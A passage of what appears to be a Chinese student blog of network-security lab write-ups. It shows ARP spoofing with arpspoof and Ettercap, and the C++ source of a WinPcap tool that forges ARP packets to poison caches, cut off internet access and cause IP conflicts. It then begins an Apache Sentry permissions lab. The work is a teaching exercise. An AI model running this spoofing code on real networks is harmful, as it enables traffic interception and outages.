<li><p>由于在修改etter.dns文件时只修改了*.com/<em>.rog/</em>.net,因此只能欺骗.com/.org/.net的域名，如可以正常访问<a href="www.leeyuxun.tk">www.leeyuxun.tk</a></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565662157154.png" alt="1565662157154"></p>
</li>
</ol>
<h2 id="分析ARP攻击原理"><a href="#分析ARP攻击原理" class="headerlink" title="分析ARP攻击原理"></a>分析ARP攻击原理</h2><p>在Kali通过Ettercap嗅探CentOS的同时,通过WireShark抓包工具，捕获ARP欺骗攻击的数据包，分析ARP攻击的原理。</p>
<ol>
<li><p>利用命令行<code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code>开启Kali的IP转发, 利用命令行<code>arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</code> 即<code>arpspoof -i eth0 -c host -t 192.168.88.131 -r 192.168.88.2</code>作为靶机消息转发的中间人。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565662324778.png" alt="1565662324778"></p>
</li>
<li><p>利用WireShark抓包工具抓取ARP包。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565662344454.png" alt="1565662344454"></p>
</li>
<li><p>双击打开其中一条ARP报文,根据ARP报文格式分析如下。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565662364992.png" alt="1565662364992"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565662370836.png" alt="1565662370836"></p>
</li>
<li><p>ARP报文是由14位的以太网首部和28位的ARP请求/应答构成：</p>
<ul>
<li>以太网首部如下<ul>
<li>目标以太网地址(6字节): <code>00:50:56:ef:ad:4f</code></li>
<li>源以太网地址(6字节): <code>00:0c:29:10:f5:75</code></li>
<li>帧类型(2字节): <code>0x0806</code>,表示<code>ARP协议帧</code></li>
</ul>
</li>
<li>ARP请求/应答如下<ul>
<li>硬件类型(4字节): <code>Ethernet(1) / (0x0001)</code>, 表示<code>以太网</code></li>
<li>协议类型(4字节): <code>IPv4 / (0x0080)</code>, 表示上层协议是<code>IPv4协议</code></li>
<li>硬件地址长度(1字节): <code>6 / (0x06)</code>, 表示硬件(MAC)地址长度为6字节</li>
<li>协议地址长度(1字节): <code>4 / (0x04)</code>, 表示协议地址长度为4字节,即<code>IPv4协议</code></li>
<li>操作码: <code>reply(2) / (0x0002)</code>, <code>1</code>表示<code>ARP请求</code>, <code>2</code>表示<code>ARP</code>应答, <code>3</code>表示<code>RARP</code>请求,<code>4</code>表示<code>RARP</code>应答</li>
<li>源硬件地址(6字节): <code>00:0c:29:10:f5:75</code>, 表示<code>发送方MAC地址</code></li>
<li>源IP地址(4字节): <code>192.168.88.131 / (0xc0a85883)</code>, 表示<code>发送方IP地址</code></li>
<li>目的硬件地址(6字节): <code>00:50:56:ef:ad:4f</code>, 表示<code>接收方MAC地址</code></li>
<li>目的IP地址(4字节): <code>192.168.88.2 / (0xc0a85802)</code>, 表示<code>接收方IP地址</code></li>
</ul>
</li>
</ul>
</li>
<li><p>ARP攻击原理</p>
<ol>
<li>电脑A发送ARP请求,请求IP地址为<code>192.168.88.131</code>的电脑B的MAC地址；</li>
<li>攻击者截获该请求并向电脑A发送一个伪造的ARP响应，告诉电脑A：IP地址为<code>192.168.88.130</code>的电脑B的MAC地址是<code>00:0c:29:01:f5:75</code> (攻击者的MAC地址)；</li>
<li>电脑A将这个对应关系写入自己的ARP缓存表中，以后发送数据时，将本应该发往电脑B的数据发送给了攻击者；</li>
<li>同样的，攻击者向电脑B也发送一个伪造的ARP响应，告诉电脑B：电脑A的IP地址<code>192.168.88.130</code>对应的MAC地址是<code>00:0c:29:01:f5:75</code>，电脑B也会将数据发送给攻击者。</li>
</ol>
</li>
</ol>
<h2 id="Winpacp实现ARP欺骗"><a href="#Winpacp实现ARP欺骗" class="headerlink" title="Winpacp实现ARP欺骗"></a>Winpacp实现ARP欺骗</h2><p>基于Winpcap编写程序，对指定的目标IP地址进行ARP欺骗攻击。</p>
<h3 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h3><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663142897.png" alt="1565663142897"></p>
<h3 id="搭建编程环境"><a href="#搭建编程环境" class="headerlink" title="搭建编程环境"></a><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663099808.png" alt="1565663099808">搭建编程环境</h3><ol>
<li><p>下载安装<code>WinPcap运行库</code>，下载解压<code>WinPcap开发包</code>。</p>
</li>
<li><p>打开vs2017,新建<code>windows控制台应用程序</code>。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663229669.png" alt="1565663229669"></p>
</li>
<li><p>打开<code>项目属性-&gt;配置属性-&gt;c/c++-&gt;预处理器-&gt;预处理器定义</code>，在其中添加<code>WPCAP</code>、<code>HAVE_REMOTE</code>两个宏定义。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663291347.png" alt="1565663291347"></p>
</li>
<li><p>打开<code>项目属性-&gt;配置属性-&gt;链接器-&gt;输入-&gt;附加依赖项</code>添加<code>wpcap.lib</code>和<code>ws2_32.lib</code>两个库。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663338989.png" alt="1565663338989"></p>
</li>
<li><p>打开<code>项目属性-&gt;配置属性-&gt;VC++目录-&gt;包含目录</code>和同级的<code>库目录</code>分别添加之前下载解压的<code>WinPcap开发包</code>的<code>Include目录</code>和<code>Lib目录</code>路径。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663408382.png" alt="1565663408382"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663414285.png" alt="1565663414285"></p>
</li>
<li><p>调用相关的WinPcap库进行代码编写，设置Kali为靶机，查找攻击机，靶机和攻击机的IP地址、MAC地址（伪造地址是执行程序时输入的）。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 确定IP地址和MAC地址 */</span></span><br><span class="line">CONST	UCHAR	dst_mac[<span class="number">6</span>] = &#123; <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x29</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0x75</span> &#125;;	<span class="comment">//被攻击方的MAC</span></span><br><span class="line">CONST	UCHAR	gateway_mac[<span class="number">6</span>] = &#123; <span class="number">0x00</span>, <span class="number">0x50</span>, <span class="number">0x56</span>, <span class="number">0xEF</span>, <span class="number">0xAD</span>, <span class="number">0x4F</span> &#125;; <span class="comment">//网关的MAC</span></span><br><span class="line">CONST	UCHAR	src_mac[<span class="number">6</span>] = &#123; <span class="number">0xDE</span>, <span class="number">0x1A</span>, <span class="number">0x1A</span>, <span class="number">0xF3</span>, <span class="number">0x88</span>, <span class="number">0x83</span> &#125;;	<span class="comment">//攻击者的MAC</span></span><br><span class="line">CONST	CHAR	dst_ip[] = <span class="string">&quot;192.168.88.130&quot;</span>;	<span class="comment">//被攻击方IP</span></span><br><span class="line">CONST	CHAR	gateway_ip[] = <span class="string">&quot;192.168.88.2&quot;</span>;	<span class="comment">//网关IP </span></span><br><span class="line">		CHAR	forged_mac[<span class="number">6</span>] = &#123; <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span> &#125;;	<span class="comment">//伪造MAC</span></span><br><span class="line">		CHAR	forged_ip[] = <span class="string">&quot;0.0.0.0&quot;</span>;	<span class="comment">//伪造IP</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><ol>
<li><p>构造ARP数据包</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 构造ARP包 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(1)		<span class="comment">//结构体字节长度是一的倍数，不可省略</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">__arp_packet</span> &#123;</span><br><span class="line">	UCHAR		ether_dhost[<span class="number">6</span>];				<span class="comment">//目标以太网地址 </span></span><br><span class="line">	UCHAR		ether_shost[<span class="number">6</span>];				<span class="comment">//源以太网地址 </span></span><br><span class="line">	USHORT		ether_type;					<span class="comment">//以太网类型</span></span><br><span class="line">	USHORT		hardware_type;				<span class="comment">//硬件类型</span></span><br><span class="line">	USHORT		protocol_type;				<span class="comment">//协议类型</span></span><br><span class="line">	USHORT		hardware_protocol_len;		<span class="comment">//硬件地址和协议地址长度第一个字节时硬件地址长度,第二个字节时协议地址长度</span></span><br><span class="line">	USHORT		opcode;						<span class="comment">//操作码</span></span><br><span class="line">	UCHAR		src_hrd_addr[<span class="number">6</span>];			<span class="comment">//源硬件地址</span></span><br><span class="line">	ULONG		src_ip;						<span class="comment">//源IP地址</span></span><br><span class="line">	UCHAR		dst_hrd_addr[<span class="number">6</span>];			<span class="comment">//目标硬件地址</span></span><br><span class="line">	ULONG		dst_ip;						<span class="comment">//目标IP地址</span></span><br><span class="line">&#125; ARP_PKT;</span><br></pre></td></tr></table></figure></li>
<li><p>获得本地计算机上所有的网络设备表</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*获得本地计算机上所有的网络设备表*/</span></span><br><span class="line"><span class="built_in">pcap_findalldevs</span>(&amp;alldevs, errbuf)</span><br></pre></td></tr></table></figure></li>
<li><p>打开网卡</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 打开网卡 */</span></span><br><span class="line"><span class="built_in">pcap_open</span>(d-&gt;name,<span class="number">65536</span>,PCAP_OPENFLAG_PROMISCUOUS,<span class="number">1000</span>,<span class="literal">NULL</span>,errbuf))</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>释放设备列表</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 释放设备列表 */</span></span><br><span class="line"><span class="built_in">pcap_freealldevs</span>(alldevs)</span><br></pre></td></tr></table></figure></li>
<li><p>发送ARP数据包</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 发送ARP包 */</span></span><br><span class="line"><span class="built_in">pcap_sendpacket</span>(handle, (<span class="type">unsigned</span> <span class="type">char</span> *)&amp;pkt, <span class="built_in">sizeof</span>(ARP_PKT))</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><h4 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h4><ol>
<li><p>打开靶机，利用命令行<code>arp -n</code>查看<code>ARP缓存</code>。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664387481.png" alt="1565664387481"></p>
</li>
<li><p>打开程序，进行ARP欺骗(伪造的MAC地址为<code>1A-1A-1A-1A-1A-1A</code>，伪造的IP地址为<code>88.88.88.88</code>，发送ARP包<code>1000</code>个，发送间隔<code>100ms</code>)。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664404355.png" alt="1565664404355"></p>
</li>
<li><p>攻击结束后再次利用命令行<code>arp -n</code>查看ARP缓存，发现<strong>多了一条缓存</strong>，IP地址为<code>88.88.88.88</code>，MAC地址为<code>1A-1A-1A-1A-1A-1A</code>, 与伪造的相同，攻击成功。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664411960.png" alt="1565664411960"></p>
</li>
</ol>
<h4 id="禁止上网"><a href="#禁止上网" class="headerlink" title="禁止上网"></a>禁止上网</h4><ol>
<li><p>用靶机打开<a href="http://www.taobao.com/">www.taobao.com</a>，并ping百度域<a href="http://www.baidu.com/">www.baidu.com</a>，可正常上网。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664449611.png" alt="1565664449611"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664459530.png" alt="1565664459530"></p>
</li>
<li><p>打开程序，进行禁止上网攻击(伪造MAC地址为<code>90-90-90-90-90-90</code>，发送ARP包<code>1000</code>个，发送间隔<code>100ms</code>) </p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664524204.png" alt="1565664524204"></p>
</li>
<li><p>在攻击过程中打开<a href="http://www.taobao.com/">www.taobao.com</a>，并ping百度域<a href="http://www.baidu.com/">www.baidu.com</a>,无法上网。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664536161.png" alt="1565664536161"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664544848.png" alt="1565664544848"></p>
</li>
<li><p>在攻击过程中使用wareshark抓包。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664561633.png" alt="1565664561633"></p>
</li>
<li><p>分析ARP包结构，发现源MAC地址是伪造的MAC地址，ARP包没有错误。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664628262.png" alt="1565664628262"></p>
</li>
</ol>
<h4 id="IP冲突攻击"><a href="#IP冲突攻击" class="headerlink" title="IP冲突攻击"></a>IP冲突攻击</h4><ol>
<li><p>用靶机打开<a href="http://www.baidu.com/">www.baidu.com</a>，并ping百度域名<a href="http://www.baidu.com/">www.baidu.com</a>,<br>可正常上网。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664726685.png" alt="1565664726685"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664731112.png" alt="1565664731112"></p>
</li>
<li><p>打开程序，进行禁止上网攻击(发送ARP包<code>1000</code>个，发送间隔<code>100ms</code>) 。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664745324.png" alt="1565664745324"></p>
</li>
<li><p>在攻击过程中打开<a href="http://www.baidu.com/">www.baidu.com</a>，并ping百度域名<a href="http://www.baidu.com/">www.baidu.com</a>,<br>无法上网。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664753049.png" alt="1565664753049"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664758887.png" alt="1565664758887"></p>
</li>
<li><p>在攻击过程中使用wareshark抓包, 分析ARP包结构，靶机的IP地址对应的是攻击机的MAC地址，由于无法查看网关上的ARP列表，根据接收的ARP包的信息和无法上网可以判断网关ARP列表上会出现靶机IP地址对应两个MAC地址的现象，一个靶机的MAC地址，一个攻击机的MAC地址，即实现了IP冲突攻击。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664793294.png" alt="1565664793294"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664799061.png" alt="1565664799061"></p>
</li>
</ol>
<h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p>​        ARP欺骗的原理是由于<strong>局域网的网络传输并不是通过IP而是通过mac地址</strong>，因此模拟出一个不存的mac地址进行收发数据，这样会导致不能正常的进行网络通信。本实验是基于WinPcaP的，实验过程熟悉了WinPcaP的安装配置方法。ARP攻击其实会导致很严重的后果，那么如何防范ARP攻击，这就是需要思考的问题，目前了解的方法有清空ARP缓存和指定ARP对应关系。</p>
<h3 id="实验核心代码"><a href="#实验核心代码" class="headerlink" title="实验核心代码"></a>实验核心代码</h3><p><a href="https://download.csdn.net/download/weixin_41936557/11538034">点击下载程序源代码</a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 选择网卡接口 */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">select_adapters</span>(&amp;handle) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 选择攻击方式 */</span></span><br><span class="line">start_attacking:</span><br><span class="line"><span class="keyword">switch</span> (<span class="built_in">select_attackmethod</span>())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: <span class="keyword">goto</span> location_1; <span class="keyword">break</span>; </span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: <span class="keyword">goto</span> location_2; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:	<span class="keyword">goto</span> location_3; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>: <span class="keyword">return</span> <span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>: <span class="keyword">return</span> <span class="number">-1</span>;	<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">pcap_if_t</span>	*alldevs;					<span class="comment">//获取到的网络设备列表</span></span><br><span class="line"><span class="type">pcap_if_t</span>	*d;							<span class="comment">//指向的一个网络设备</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* 检索设备列表 */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">pcap_findalldevs</span>(&amp;alldevs, errbuf) == <span class="number">-1</span>)<span class="comment">//pcap_findalldevs获得本地计算机上所有的网络设备列表</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;检索设备列表错误: %s\n&quot;</span>, errbuf);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 打印设备列表 */</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;所有网络设备如下：\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (d = alldevs; d; d = d-&gt;next)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d. %s&quot;</span>, ++i, d-&gt;name);</span><br><span class="line">	<span class="keyword">if</span> (d-&gt;description)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; (%s)\n&quot;</span>, d-&gt;description);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; (没有合适的描述)\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n没有发现设备！\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入设备编号 (1-%d): &quot;</span>, i);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line">	<span class="keyword">if</span> (num &lt; <span class="number">1</span> || num &gt; i)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;接口编号不在列表范围内，请重新输入 (1-%d)：&quot;</span>, i);</span><br><span class="line">&#125; <span class="keyword">while</span> (num &lt; <span class="number">1</span> || num &gt; i);</span><br><span class="line"><span class="comment">/* 跳转到已选设备 */</span></span><br><span class="line"><span class="keyword">for</span> (d = alldevs, i = <span class="number">0</span>; i &lt; num - <span class="number">1</span>; d = d-&gt;next, i++);</span><br><span class="line"><span class="comment">/* 打开网卡 */</span></span><br><span class="line"><span class="keyword">if</span> ((*handle = <span class="built_in">pcap_open</span>(d-&gt;name,	<span class="comment">// 设备名</span></span><br><span class="line">	<span class="number">65536</span>,							<span class="comment">// 要捕获的数据包的哪一部分,65536保证能捕获到不同数据链路层上的每个数据包上的全部内容</span></span><br><span class="line">	PCAP_OPENFLAG_PROMISCUOUS,		<span class="comment">// 混杂模式</span></span><br><span class="line">	<span class="number">1000</span>,							<span class="comment">// 读取超时时间</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">// 远程机器验证</span></span><br><span class="line">	errbuf							<span class="comment">// 错误缓冲</span></span><br><span class="line">)) == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\n无法打开网卡. %s 不支持WinPcap！\n&quot;</span>);</span><br><span class="line">	<span class="built_in">pcap_freealldevs</span>(alldevs);	<span class="comment">//释放设备列表</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 填充ARP包 */</span></span><br><span class="line">ARP_PKT		pkt;	<span class="comment">//ARP包</span></span><br><span class="line"><span class="built_in">memcpy</span>(pkt.ether_dhost, dst_mac, <span class="number">6</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(pkt.ether_shost, forged_mac, <span class="number">6</span>);</span><br><span class="line">pkt.ether_type = ::<span class="built_in">htons</span>(<span class="number">0x0806</span>);</span><br><span class="line">pkt.hardware_type = <span class="built_in">htons</span>(<span class="number">0x0001</span>);</span><br><span class="line">pkt.protocol_type = <span class="built_in">htons</span>(<span class="number">0x0800</span>);</span><br><span class="line">pkt.hardware_protocol_len = <span class="built_in">htons</span>(<span class="number">0x0604</span>);</span><br><span class="line">pkt.opcode = <span class="built_in">htons</span>(<span class="number">0x0001</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(pkt.src_hrd_addr, forged_mac, <span class="number">6</span>);</span><br><span class="line">pkt.src_ip = <span class="built_in">inet_addr</span>(forged_ip);</span><br><span class="line"><span class="built_in">memcpy</span>(pkt.dst_hrd_addr, dst_mac, <span class="number">6</span>);</span><br><span class="line">pkt.dst_ip = <span class="built_in">inet_addr</span>(dst_ip);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 发送ARP包 */</span></span><br><span class="line"><span class="keyword">while</span> (send_num &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">pcap_sendpacket</span>(handle, (<span class="type">unsigned</span> <span class="type">char</span> *)&amp;pkt, <span class="built_in">sizeof</span>(ARP_PKT)) != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;ARP包发送错误: \n&quot;</span>, <span class="built_in">pcap_geterr</span>(handle));</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">Sleep</span>(interval);	<span class="comment">//设定间隔时间</span></span><br><span class="line">	send_num--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络安全实验</category>
      </categories>
      <tags>
        <tag>ARP欺骗</tag>
        <tag>winpcap</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Sentry的权限分配实验</title>
    <url>/Apache-Sentry%E7%9A%84%E6%9D%83%E9%99%90%E5%88%86%E9%85%8D%E5%AE%9E%E9%AA%8C.html</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol>
<li>通过Apache Sentry对Hadoop系统中的数据实现细粒度控制；</li>
<li>学会使用Cloudera Manager快速管理和部署Hadoop相关服务.  </li>
</ol>
<span id="more"></span>

<h1 id="软件设备"><a href="#软件设备" class="headerlink" title="软件设备"></a>软件设备</h1><ul>
<li><p>软件设备</p>
<ul>
<li>VMware虚拟机运行程序</li>
<li>cloudera-quickstart-vm-5.13.0-0 虚拟机（下载网址：<a href="https://downloads.cloudera.com/demo_vm/vmware/cloudera-quickstart-vm-5.13.0-0-vmware.zip%EF%BC%89">https://downloads.cloudera.com/demo_vm/vmware/cloudera-quickstart-vm-5.13.0-0-vmware.zip）</a></li>
</ul>
</li>
<li><p>硬件设备</p>
<ul>
<li>可运行虚拟机的windows 10宿主机</li>
</ul>
</li>
</ul>
<h1 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h1><p>在未使用Sentry前，Hadoop对用户的授权是粗粒度级的，用户或者不能访问文件内的数据或者能访问整个文件的数据。Sentry可以控制用户对Hadoop中数据的访问，并对已通过验证的用户提供数据访问特权。该特权可细分到查找、插入、删除等操作的控制以及用户可查看数据库中的哪些数据。</p>
<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><ol>
<li>熟悉Cloudera Manager，并在系统中部署Apache Sentry服务；</li>
<li>使用Apache Sentry对数据库实现简单的授权管理；</li>
</ol>
<h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><h2 id="Apache-Sentry安装步骤"><a href="#Apache-Sentry安装步骤" class="headerlink" title="Apache Sentry安装步骤"></a>Apache Sentry安装步骤</h2><ol>
<li><p>使用vmware打开cloudera-quickstart-vm-5.13.0-0 虚拟机文件并调整虚拟机参数如下；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203110703.png"></p>
</li>
<li><p>进入系统后打开终端，输入<code>sudo /home/cloudera/cloudera-manager --force --express</code> 命令，等待cloudera manager启动。出现<code>Username: cloudera</code>和<code>Password: cloudera</code>表明Cloudera Manager启动成功；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203112532.png"></p>
<p>点击浏览器书签栏的Cloudera Manager书签，网页载入完毕后会弹出提示信息，点击<code>I Agree</code>，输入之前获取的用户名和密码进入图形化管理界面；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203112701.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203112746.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203113051.png"></p>
</li>
<li><p>切换到终端，输入<code>mysql -u root -p</code>进入数据库，密码为上一步的<code>cloudera</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203113229.png"></p>
<p>进入数据库后，通过命令删除sentry@’%’用户以及sentry数据库；</p>
<ul>
<li><p>删除前<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203115224.png"></p>
</li>
<li><p>删除</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203115449.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203115508.png"></p>
</li>
<li><p>删除后</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203115559.png"></p>
</li>
</ul>
<p>然后重新创建sentry用户和sentry数据库，并对新创建的sentry用户赋予对sentry数据库的全部操作权限；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create user sentry identified by &#x27;sentry123456&#x27;;</span><br><span class="line">grant all on sentry.* to sentry@&#x27;localhost&#x27; identified by &#x27;sentry123456&#x27;;</span><br><span class="line">grant all on sentry.* to sentry@&#x27;%&#x27; identified by &#x27;sentry123456&#x27;;</span><br><span class="line">create database sentry;</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203120432.png"></p>
</li>
<li><p>切换到浏览器中Cloudera Manager管理界面，点击左侧管理面板的小三角，选择<code>Add Service</code>，下拉选择<code>Sentry</code>，点击<code>Continue</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203120929.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203121021.png"></p>
<p>到达Customize Role assignments for Sentry界面后不进行修改，点击<code>Continue</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203163649.png"></p>
<p>到达Database Setup部分，输入前面步骤中设置的sentry数据库名称“sentry”、用户名以及密码，并点击<code>Test Connection</code>确保可连接；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203163925.png"></p>
<p>完成后，点击<code>continue</code>等待各个服务重启，全部完成后点击<code>continue</code>，之后点击<code>finish</code>完成<strong>sentry服务</strong>的添加；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203164238.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203164333.png"></p>
</li>
<li><p>配置Hive</p>
<p>进入浏览器中Cloudera Manager主界面，点击左侧栏的<code>Hive</code>。进入Hive设置界面后点击左上角的<code>Configuration</code>，在下方界面的Search输入<code>sentry</code>，并将<code>Sentry Service</code>选项修改为<code>Sentry</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203165013.png"></p>
<p>之后在Search输入<code>imper</code>，取消<code>Impersonation</code>的相关选项；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203165111.png"></p>
<p>完成后在Search输入<code>sentry-site</code>，点击加号添加<code>sentry.hive.testing.mode</code>键并将值设为<code>true</code>；</p>
